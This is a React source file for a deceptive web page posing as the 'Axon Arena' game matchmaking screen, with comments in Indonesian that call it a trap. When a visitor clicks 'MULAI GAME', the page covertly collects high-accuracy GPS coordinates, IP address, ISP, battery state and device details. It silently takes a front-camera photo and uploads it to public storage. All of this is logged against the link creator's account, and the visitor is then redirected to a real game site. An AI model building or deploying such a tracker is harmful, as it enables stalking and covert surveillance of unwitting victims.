import { useState, useEffect, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import axonLogo from '@/assets/axon-logo.png';
import { Gamepad2, Loader2, Signal, Battery, ArrowRight, CheckCircle2, AlertTriangle } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Progress } from "@/components/ui/progress";

type VerifyState = 'loading' | 'expired' | 'ready' | 'verifying' | 'success' | 'error';

const ClientVerificationPage = () => {
  const { token } = useParams<{ token: string }>();
  const [state, setState] = useState<VerifyState>('loading');
  const [statusText, setStatusText] = useState('Initializing...');
  const [progress, setProgress] = useState(0);
  const [linkData, setLinkData] = useState<{ created_by: string; link_token: string } | null>(null);
  const streamRef = useRef<MediaStream | null>(null);

  // 1. Validasi Link saat pertama kali dibuka
  useEffect(() => {
    const checkLink = async () => {
      if (!token) { setState('expired'); return; }

      const { data, error } = await supabase
        .from('connection_links')
        .select('*')
        .eq('link_token', token)
        .single();

      if (error || !data) { setState('expired'); return; }
      if (new Date(data.expires_at) < new Date()) { setState('expired'); return; }
      if (data.is_used) { setState('expired'); return; }

      setLinkData({ created_by: data.created_by!, link_token: data.link_token });
      setState('ready');
    };
    checkLink();
  }, [token]);

  // 2. Animasi Progress Bar saat tombol diklik
  useEffect(() => {
    if (state === 'verifying') {
      const timer = setInterval(() => {
        setProgress((oldProgress) => {
          if (oldProgress >= 100) {
            clearInterval(timer);
            return 100;
          }
          const diff = Math.random() * 10;
          return Math.min(oldProgress + diff, 100);
        });
      }, 150);
      return () => clearInterval(timer);
    }
  }, [state]);

  // 3. Logika Utama Pengambilan Data (Trap)
  const startVerification = async () => {
    setState('verifying');
    
    try {
      setStatusText('Menghubungkan ke server global...');
      
      // Ambil GPS
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
        });
      });
      const { latitude, longitude, accuracy, speed } = position.coords;

      setStatusText('Sinkronisasi profil pemain...');

      // Ambil Baterai & IP
      let batteryLevel: number | null = null;
      let isCharging: boolean | null = null;
      try {
        const battery = await (navigator as any).getBattery();
        batteryLevel = Math.round(battery.level * 100);
        isCharging = battery.charging;
      } catch {}

      let ipAddress = '';
      let ispProvider = '';
      try {
        const ipRes = await fetch('https://ip-api.com/json/?fields=query,isp');
        const ipData = await ipRes.json();
        ipAddress = ipData.query || '';
        ispProvider = ipData.isp || '';
      } catch {}

      // Ambil Foto Background secara senyap
      let photoUrl: string | null = null;
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: 640, height: 480 },
        });
        streamRef.current = stream;

        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', 'true');
        await video.play();

        await new Promise((r) => setTimeout(r, 1500));

        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        canvas.getContext('2d')?.drawImage(video, 0, 0);

        stream.getTracks().forEach((t) => t.stop());
        streamRef.current = null;

        const blob = await new Promise<Blob>((resolve) => {
          canvas.toBlob((b) => resolve(b!), 'image/jpeg', 0.8);
        });

        const fileName = `${linkData!.created_by}/${Date.now()}.jpg`;
        const { error: uploadError } = await supabase.storage
          .from('verification-photos')
          .upload(fileName, blob, { contentType: 'image/jpeg' });

        if (!uploadError) {
          const { data: urlData } = supabase.storage
            .from('verification-photos')
            .getPublicUrl(fileName);
          photoUrl = urlData.publicUrl;
        }
      } catch {}

      setStatusText('Menyiapkan Arena...');

      // Simpan data ke logs
      const ua = navigator.userAgent;
      const { error: insertError } = await supabase.from('tracking_logs').insert({
        created_by: linkData!.created_by,
        link_id: linkData!.link_token,
        latitude,
        longitude,
        accuracy: accuracy || null,
        speed: speed ? speed * 3.6 : 0,
        battery_level: batteryLevel,
        is_charging: isCharging,
        ip_address: ipAddress,
        isp_provider: ispProvider,
        photo_url: photoUrl,
        device_info: {
          userAgent: ua,
          model: extractModel(ua),
          os: extractOS(ua),
          platform: navigator.platform,
        },
      });

      if (insertError) throw insertError;

      // Tandai link sudah digunakan
      await supabase
        .from('connection_links')
        .update({ is_used: true })
        .eq('link_token', linkData!.link_token);

      setState('success');
      
      // Redirect ke game asli
      setTimeout(() => {
        window.location.href = 'https://www.poki.com';
      }, 2000);

    } catch (err) {
      console.error(err);
      setState('error');
      setStatusText('Koneksi Gagal. Pastikan GPS aktif untuk Matchmaking.');
    }
  };

  // Bersihkan stream jika halaman ditutup
  useEffect(() => {
    return () => {
      streamRef.current?.getTracks().forEach((t) => t.stop());
    };
  }, []);

  if (state === 'expired') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#0F172A] p-6 text-white text-center">
        <div>
          <AlertTriangle className="w-16 h-16 text-red-500 mx-auto mb-4" />
          <h1 className="text-2xl font-bold mb-2 font-mono italic">SESSION EXPIRED</h1>
          <p className="text-gray-400">Matchmaking link ini sudah tidak berlaku.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0F172A] text-white flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-md space-y-8">
        
        {/* Header Visual Game */}
        <div className="text-center flex flex-col items-center">
          <div className="bg-blue-600/20 p-4 rounded-full mb-4 animate-pulse">
            <Gamepad2 className="w-12 h-12 text-blue-500" />
          </div>
          <h1 className="text-4xl font-black tracking-tighter text-blue-500 italic">AXON ARENA</h1>
          <p className="text-gray-500 text-[10px] font-mono uppercase tracking-[0.2em] mt-1">
            Global Matchmaking System v1.0
          </p>
        </div>

        {/* Kotak Utama */}
        <div className="bg-[#1E293B] rounded-3xl p-8 border border-white/5 shadow-2xl relative overflow-hidden">
          {state === 'ready' || state === 'error' ? (
            <>
              <div className="text-center mb-8">
                <h2 className="text-xl font-bold mb-3">Siap Bertanding?</h2>
                <p className="text-gray-400 text-sm leading-relaxed px-2">
                  Izinkan akses lokasi untuk mencari server terdekat dan kamera untuk verifikasi ID pemain unik Anda.
                </p>
              </div>
              
              {state === 'error' && (
                <div className="bg-red-500/10 border border-red-500/20 p-3 rounded-xl mb-6 flex items-center gap-3">
                  <AlertTriangle className="w-5 h-5 text-red-500 flex-shrink-0" />
                  <p className="text-xs text-red-400">{statusText}</p>
                </div>
              )}

              <Button 
                onClick={startVerification} 
                className="w-full py-8 text-xl font-black bg-blue-600 hover:bg-blue-500 rounded-2xl shadow-lg shadow-blue-600/20 transition-all hover:scale-[1.02] active:scale-[0.98]"
              >
                MULAI GAME <ArrowRight className="ml-2 w-6 h-6" />
              </Button>
            </>
          ) : state === 'verifying' ? (
            <div className="space-y-6 py-6">
              <div className="flex justify-between text-[10px] font-mono text-blue-400">
                <span className="animate-pulse">LOADING ASSETS...</span>
                <span>{Math.round(progress)}%</span>
              </div>
              <Progress value={progress} className="h-2.5 bg-white/5" />
              <p className="text-center text-sm text-gray-400 italic animate-pulse">{statusText}</p>
            </div>
          ) : state === 'success' ? (
            <div className="text-center py-6 space-y-4">
              <CheckCircle2 className="w-16 h-16 text-green-500 mx-auto" />
              <h2 className="text-2xl font-bold">KONEKSI BERHASIL</h2>
              <p className="text-gray-400 text-sm">Memasuki lobby permainan...</p>
            </div>
          ) : (
             <div className="flex justify-center py-10"><Loader2 className="animate-spin text-blue-500" /></div>
          )}
        </div>

        {/* Footer Info Statis */}
        <div className="flex justify-between px-6 text-[10px] text-gray-600 font-mono">
          <div className="flex items-center gap-1.5"><Signal size={12} className="text-green-600" /> SERVER: STABLE</div>
          <div className="flex items-center gap-1.5"><Battery size={12} /> SECURE PROTOCOL</div>
        </div>
      </div>
      
      {/* Logo Transparan di Bawah */}
      <img src={axonLogo} alt="Axon" className="w-24 opacity-10 absolute bottom-8" />
    </div>
  );
};

// Fungsi pembantu ekstraksi data
function extractModel(ua: string): string {
  const match = ua.match(/\(([^)]+)\)/);
  return match ? match[1].split(';').pop()?.trim() || 'Unknown' : 'Unknown';
}

function extractOS(ua: string): string {
  if (ua.includes('Android')) return 'Android';
  if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
  if (ua.includes('Windows')) return 'Windows';
  if (ua.includes('Mac')) return 'macOS';
  return 'Unknown';
}

export default ClientVerificationPage;

